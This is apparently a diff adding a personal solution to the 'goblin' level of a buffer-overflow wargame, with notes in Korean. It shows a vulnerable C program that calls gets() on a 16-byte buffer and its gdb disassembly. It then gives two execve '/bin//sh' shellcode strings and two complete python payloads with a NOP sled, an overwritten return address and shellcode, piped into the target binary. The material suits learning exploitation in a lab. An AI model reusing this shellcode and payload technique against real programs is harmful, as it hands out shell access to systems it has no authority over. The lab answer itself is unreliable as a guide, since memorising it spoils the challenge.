@@ -1,0 +1,61 @@
+[cobolt@localhost cobolt]$ cat goblin.c
+/*
+        The Lord of the BOF : The Fellowship of the BOF
+        - goblin
+        - small buffer + stdin
+*/
+
+int main()
+{
+    char buffer[16];
+    gets(buffer);
+    printf("%s\n", buffer);
+}
+
+(gdb) disas main
+Dump of assembler code for function main:
+0x80483f8 <main>:       push   %ebp
+0x80483f9 <main+1>:     mov    %ebp,%esp
+
+0x80483fb <main+3>:     sub    %esp,16
+
+0x80483fe <main+6>:     lea    %eax,[%ebp-16]
+0x8048401 <main+9>:     push   %eax
+0x8048402 <main+10>:    call   0x804830c <gets>
+
+0x8048407 <main+15>:    add    %esp,4
+
+0x804840a <main+18>:    lea    %eax,[%ebp-16]
+0x804840d <main+21>:    push   %eax
+0x804840e <main+22>:    push   0x8048470
+0x8048413 <main+27>:    call   0x804833c <printf>
+
+0x8048418 <main+32>:    add    %esp,8
+
+0x804841b <main+35>:    leave
+0x804841c <main+36>:    ret
+
+0x804841d <main+37>:    nop
+0x804841e <main+38>:    nop
+0x804841f <main+39>:    nop
+
+
+ret 유도주소:
+0xbffffb28
+
+\x90x20 , \x28\xfb\xff\xbf , \x90x100, [shell]
+[shell 1]
+\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80
+[shell 2]
+\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
+[최종 페이로드]
+(python -c 'print "\x90"*20+"\x28\xfb\xff\xbf"+"\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"';cat) | ./goblin
+
+
+------------------------------------------------
+0xbffffb68
+1. buffer, sfp를 넘어 ret에 argv[1]주소값 삽입
+2. argv[1]에 해당하는 인자로 NOP slide+ 쉘코드 삽입
+(python -c 'print "\x90"*20+"\x68\xfb\xff\xbf"';cat) | ./goblin `python -c 'print "\x90"*1000+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"'`
+
+
